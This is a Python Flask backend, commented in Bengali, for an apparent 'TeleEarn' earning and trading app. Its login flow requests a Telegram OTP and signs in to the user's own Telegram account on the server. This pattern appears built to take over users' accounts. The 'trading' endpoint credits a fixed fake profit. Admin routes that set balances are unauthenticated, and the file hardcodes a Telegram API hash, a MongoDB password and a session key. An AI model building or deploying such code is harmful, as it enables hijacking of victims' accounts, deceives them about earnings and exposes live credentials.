import os
import asyncio
import nest_asyncio
from flask import Flask, render_template, request, jsonify, session, redirect, url_for
from flask_cors import CORS
from pymongo import MongoClient
from telethon import TelegramClient
from telethon.sessions import StringSession
from datetime import datetime

# ১. সিস্টেম কনফিগারেশন
nest_asyncio.apply()
app = Flask(__name__)
app.secret_key = 'aaf_super_secret_key' # সেশন সিকিউরিটির জন্য
CORS(app)

# ২. ডাটাবেস ও টেলিগ্রাম এপিআই
API_ID = 36466824
API_HASH = '535ddcb85f2c3c74cc0ff532dd2c3406'
MONGO_URI = "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?appName=Cluster0"

client_db = MongoClient(MONGO_URI)
db = client_db['AAF_TeleEarn']
users_col = db['users']
settings_col = db['settings'] # এডমিন সেটিংসের জন্য

temp_clients = {}

# --- ৩. ইউজার প্যানেল রাউটিং (Routes) ---
@app.route('/')
def home(): return render_template('login.html')

@app.route('/dashboard')
def dashboard(): return render_template('dashboard.html')

@app.route('/task')
def task(): return render_template('task.html')

@app.route('/trading')
def trading(): return render_template('trading.html')

@app.route('/wallet')
def wallet(): return render_template('wallet.html')

@app.route('/accounts')
def accounts(): return render_template('accounts.html')

# --- ৪. এডমিন প্যানেল ফাংশনালিটি ---
@app.route('/admin')
def admin_login_page(): return render_template('admin_login.html')

@app.route('/admin/dashboard')
def admin_dashboard():
    all_users = list(users_col.find().limit(100))
    return render_template('admin_dashboard.html', users=all_users)

@app.route('/api/admin/update_user', methods=['POST'])
def update_user():
    data = request.json
    uid = data.get('user_id')
    amount = data.get('balance')
    users_col.update_one({"telegram_id": int(uid)}, {"$set": {"main_balance": float(amount)}})
    return jsonify({"success": True, "message": "Balance Updated!"})

# --- ৫. টেলিগ্রাম ওটিপি ও লগইন লজিক ---
@app.route('/api/send_otp', methods=['POST'])
async def send_otp():
    data = request.json
    phone = data.get('phone')
    try:
        loop = asyncio.get_event_loop()
        client = TelegramClient(StringSession(), API_ID, API_HASH, loop=loop)
        await client.connect()
        sent_code = await client.send_code_request(phone)
        temp_clients[phone] = {'client': client, 'hash': sent_code.phone_code_hash}
        return jsonify({"success": True, "message": "টেলিগ্রামে ওটিপি পাঠানো হয়েছে!"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

@app.route('/api/verify_login', methods=['POST'])
async def verify_login():
    data = request.json
    phone = data.get('phone')
    code = data.get('code')
    try:
        if phone in temp_clients:
            client = temp_clients[phone]['client']
            h = temp_clients[phone]['hash']
            user = await client.sign_in(phone, code, phone_code_hash=h)
            
            # ডাটাবেসে ইউজার চেক/ক্রিয়েট
            tg_id = user.id
            existing_user = users_col.find_one({"telegram_id": tg_id})
            if not existing_user:
                users_col.insert_one({
                    "telegram_id": tg_id, "phone": phone, "name": user.first_name,
                    "main_balance": 0.0, "aaf_balance": 0.0, "trade_profit": 0.0,
                    "active_accounts": 1, "joined_at": datetime.now()
                })
            
            session['user_id'] = tg_id
            return jsonify({"success": True, "user_id": tg_id})
        return jsonify({"success": False, "message": "Session expired"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

# --- ৬. ট্রেডিং লজিক (Trading API) ---
@app.route('/api/start_trade', methods=['POST'])
def start_trade():
    uid = request.json.get('user_id')
    # এখানে আপনার ট্রেডিং ক্যালকুলেশন লজিক বসবে
    users_col.update_one({"telegram_id": int(uid)}, {"$inc": {"trade_profit": 0.5}})
    return jsonify({"success": True, "new_profit": "0.5"})

# --- ৭. রেন্ডার পোর্ট ফিক্স ---
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
